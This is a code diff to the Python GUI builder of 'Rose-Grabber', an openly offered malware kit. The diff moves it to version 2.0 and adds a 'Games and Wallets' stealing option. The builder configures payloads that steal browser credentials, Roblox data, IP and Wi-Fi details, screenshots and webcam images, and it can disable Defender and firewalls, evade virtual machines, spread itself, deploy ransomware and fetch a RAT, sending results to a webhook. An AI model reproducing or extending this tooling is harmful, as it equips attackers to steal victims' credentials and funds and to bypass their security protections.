@@ -35,11 +35,9 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
-gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
-
 __title__ = 'Rose UI Builder'
 __avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-b.png'
-__version__ = '1.9'
+__version__ = '2.0'
 __debugm__ = False # Change only if you are a dev 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/$rose-wh.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
@@ -73,7 +71,6 @@ data_builder = {
     "disable_defender": False,
     "disable_firewalls": False,
     "antivm": False,
-    "antivm_webhook_url": "",
     "webcam": False,
     "icon_file": "",
     "obfuscation": False,
@@ -90,6 +87,7 @@ data_builder = {
     "spread_malware_message": "",
     "ransomware_amount_of_money": "",
     "rose_melt_stub": False,
+    "games": False
 }
 
 links = {
@@ -99,7 +97,7 @@ links = {
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
     "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
-    "rose_discord": "https://discord.gg/97UeK8PrUY"
+    "rose_discord": "https://discord.gg/sbt9drkvAA"
 }
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
@@ -191,18 +189,12 @@ def _makebuild(q: Queue, data_builder) -> str:
     if data_builder["icon_file"] == "Windows Exe" or "":
         win_exe_path = os.path.join(os.getcwd(), "components", "assets", "imageres-011.ico")
         data_builder["icon_path"] = win_exe_path
-
-    if data_builder["wallet_adress"] == "":
-        data_builder["wallet_adress"] = gumbobr0ts_wallet_adr
     
     if data_builder["file_pumper_size"] == "":
         data_builder["file_pumper_size"] = None
 
     if data_builder["rose_rat_url"] == "":
         data_builder["rose_rat_url"] = ".rat"
-        
-    if data_builder['antivm_webhook_url'] == "":
-        data_builder['antivm_webhook_url'] = data_builder['webhook_url']
 
     ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
         
@@ -276,7 +268,8 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("SPRMALWARE_MSFG", f"{data_builder['spread_malware_message']}") \
                 .replace("RANSOMWARE_AMOUNT_0F_MONEY", f"{data_builder['ransomware_amount_of_money']}") \
                 .replace("rose_melt_stub = False", f"rose_melt_stub = {data_builder['rose_melt_stub']}") \
-                
+                .replace("games = False", f"games = {data_builder['games']}") \
+
                 # noqa: E501
                 
             with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
@@ -562,6 +555,8 @@ def _home():
 
         progressbar = ui.linear_progress(value=0, show_value=False).props('instant-feedback rounded color=green-8 size=35px stripe')
         might_take = ui.label("Some steps in the process may take a few minutes, so please be patient :)")
+        #ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
+        #ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
         progressbar.visible = False
         might_take.visible = False
 
@@ -592,11 +587,12 @@ def _functions():
                         ui.input(label='Message', placeholder='Rose on top baby', on_change=lambda e: change_data('spread_malware_message', e.value)).bind_visibility_from(_spread, 'value').props('inline color=green')
 
                     ui.checkbox('Browser Credentials', on_change=lambda e: change_data('browser', e.value)).props('inline color=green')
+                    ui.checkbox('Games and Wallets', on_change=lambda e: change_data('games', e.value)).props('inline color=green')
                     ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
                     ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
                     
                 with ui.column():
-                    ui.checkbox('Device Information', on_change=lambda e: change_data('deviceinf', e.value)).props('inline color=green')
+                    ui.checkbox('System Information', on_change=lambda e: change_data('deviceinf', e.value)).props('inline color=green')
                     ui.checkbox('IP & Wi-Fi Data', on_change=lambda e: change_data('ipinf', e.value)).props('inline color=green')
                     ui.checkbox('Roblox', on_change=lambda e: change_data('roblox', e.value)).props('inline color=green')
                     ui.checkbox('Ping', on_change=lambda e: change_data('ping', e.value)).props('inline color=green')
@@ -640,7 +636,7 @@ def _github():
         with ui.row():
             ui.button("Open Rose Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'roselog.log')))
             ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(os.path.join(os.getcwd(), 'rosecompile.log')))
-        
+
         with ui.column():
             ui.markdown(f"<code>Message from {__devmsg__[0]}: {__devmsg__[1]}</code>")
             with ui.row():
@@ -681,7 +677,8 @@ ui.colors(primary='#333')
 def superhome():
     ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/%24rose-wh.png').style(
         'position: absolute; top: 3px; left: 575px; width: 90px;'
-        )    
+        )        
+
     with ui.tabs().classes('w-full center') as tabs:
         ui.tab('Home', icon='home')
         ui.tab('Functions', icon='fingerprint')
